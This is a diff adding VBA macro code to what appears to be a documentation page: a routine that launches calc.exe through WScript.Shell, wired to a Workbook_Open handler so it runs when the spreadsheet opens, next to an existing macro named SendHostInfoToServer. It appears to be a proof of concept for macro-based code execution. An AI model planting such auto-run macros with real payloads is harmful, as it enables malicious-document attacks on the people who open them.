@@ -43,6 +43,26 @@ Sub SendHostInfoToServer()
 ErrorHandler:
     MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Macro Error"
 End Sub
+-----------------------------------------------------------------------------------------
+Sub LaunchCalculator()
+    On Error GoTo ErrorHandler
+
+    Dim ShellApp As Object
+    Set ShellApp = CreateObject("WScript.Shell")
+    ShellApp.Run "calc.exe"
+
+    Exit Sub
+
+ErrorHandler:
+    MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Launch Error"
+End Sub
+-----------------------------------------------------------------------------------------
+#add in "This_Workbook"
+
+Private Sub Workbook_Open()
+    LaunchCalculator
+End Sub
+-----------------------------------------------------------------------------------------
 ```
 
 </details>
